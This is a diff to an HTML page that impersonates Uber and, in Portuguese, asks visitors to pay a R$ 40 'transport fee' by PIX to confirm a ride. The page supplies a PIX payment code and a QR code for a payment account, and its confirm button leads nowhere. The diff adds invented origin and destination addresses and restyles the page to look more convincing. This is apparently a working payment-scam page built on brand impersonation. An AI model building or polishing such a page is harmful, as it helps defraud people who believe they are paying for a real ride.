@@ -13,13 +13,14 @@
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #000000 0%, #444444 100%);
+      background: #000;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       animation: fadeIn 1s ease;
       color: #eee;
+      padding: 20px;
     }
 
     @keyframes fadeIn {
@@ -29,37 +30,64 @@
 
     .container {
       background: #111;
-      padding: 30px 25px;
-      max-width: 400px;
+      padding: 30px;
+      max-width: 420px;
       width: 100%;
       border-radius: 20px;
-      box-shadow: 0 15px 35px rgba(255, 255, 255, 0.15);
+      box-shadow: 0 15px 35px rgba(255, 255, 255, 0.08);
       text-align: center;
       animation: popUp 0.8s ease;
-      color: #eee;
     }
 
     @keyframes popUp {
-      from { transform: scale(0.9); opacity: 0; }
+      from { transform: scale(0.95); opacity: 0; }
       to { transform: scale(1); opacity: 1; }
     }
 
     .logo {
-      font-size: 28px;
+      font-size: 2rem;
       font-weight: 700;
       color: #fff;
-      margin-bottom: 5px;
-      text-shadow: 0 0 4px #fff;
+      margin-bottom: 8px;
     }
 
     .subtitle {
       color: #ccc;
-      font-size: 15px;
-      margin-bottom: 25px;
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+    }
+
+    .ride-info {
+      background: #1b1b1b;
+      padding: 16px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: left;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .location {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 8px;
+      color: #ccc;
+    }
+
+    .location-icon {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background-color: #0f0;
+    }
+
+    .location-icon.destino {
+      background-color: #f00;
     }
 
     .amount {
-      font-size: 32px;
+      font-size: 1.8rem;
       font-weight: bold;
       color: #fff;
       margin-bottom: 16px;
@@ -69,10 +97,10 @@
       background: #222;
       padding: 12px;
       border-radius: 10px;
-      font-size: 13px;
+      font-size: 0.8rem;
       word-break: break-word;
       color: #ddd;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       animation: fadeIn 1s ease 0.5s both;
       user-select: all;
     }
@@ -96,19 +124,18 @@
     }
 
     .qrcode {
-      width: 180px;
+      width: 160px;
+      max-width: 100%;
       margin: 25px auto 15px;
       display: block;
       border-radius: 12px;
-      transition: transform 0.3s ease;
       animation: pulse 2s infinite;
-      filter: grayscale(100%);
       background: #fff;
     }
 
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
+      50% { transform: scale(1.03); }
     }
 
     .btn-confirm {
@@ -116,7 +143,7 @@
       color: #eee;
       border: 2px solid #eee;
       padding: 14px 20px;
-      font-size: 15px;
+      font-size: 1rem;
       font-weight: 600;
       border-radius: 12px;
       cursor: pointer;
@@ -127,20 +154,39 @@
 
     .btn-confirm:hover {
       background: #222;
-      box-shadow: 0 8px 20px rgba(255, 255, 255, 0.2);
+      box-shadow: 0 8px 20px rgba(255, 255, 255, 0.15);
       transform: scale(1.03);
     }
 
     .copiado-msg {
       margin-top: 8px;
-      font-size: 13px;
+      font-size: 0.8rem;
       color: #bbb;
       display: none;
     }
 
-    @media (max-width: 420px) {
+    @media (max-width: 480px) {
       .container {
-        margin: 20px;
+        padding: 24px 18px;
+        border-radius: 16px;
+      }
+
+      .logo {
+        font-size: 1.8rem;
+      }
+
+      .subtitle {
+        font-size: 0.9rem;
+      }
+
+      .amount {
+        font-size: 1.5rem;
+      }
+
+      .btn-copy,
+      .btn-confirm {
+        font-size: 0.9rem;
+        padding: 12px;
       }
     }
   </style>
@@ -151,16 +197,27 @@
     <div class="logo">UBER</div>
     <div class="subtitle">Para confirmar sua viagem, realize o pagamento da taxa de transporte:</div>
 
-    <div class="amount">R$ 30,00</div>
+    <div class="ride-info">
+      <div class="location">
+        <span class="location-icon"></span>
+        <span><strong>Origem:</strong> Av. Paulista, 1000 - São Paulo, SP</span>
+      </div>
+      <div class="location">
+        <span class="location-icon destino"></span>
+        <span><strong>Destino:</strong> R. Oscar Freire, 250 - São Paulo, SP</span>
+      </div>
+    </div>
+
+    <div class="amount">R$ 40,00</div>
 
     <div id="pixCode" class="pix-box">
-      00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/d18098e4ad4b4366912e6bcb1c60ef8c5204000053039865802BR5905EFISA6008SAOPAULO62070503***630492D4
+      00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/836d9443808e4158ba7b9be09f98f6675204000053039865802BR5905EFISA6008SAOPAULO62070503***63042D6B
     </div>
 
     <button class="btn-copy" onclick="copiarPix()">📋 Copiar código PIX</button>
     <div id="copiadoMsg" class="copiado-msg">Código copiado com sucesso!</div>
 
-    <img class="qrcode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/d18098e4ad4b4366912e6bcb1c60ef8c5204000053039865802BR5905EFISA6008SAOPAULO62070503***630492D4" alt="QR Code Pix">
+    <img class="qrcode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/836d9443808e4158ba7b9be09f98f6675204000053039865802BR5905EFISA6008SAOPAULO62070503***63042D6B" alt="QR Code Pix">
 
     <button class="btn-confirm" onclick="window.location.href='#'">Confirmar Pagamento</button>
   </div>
@@ -180,6 +237,3 @@
 
 </body>
 </html>
-
-
-
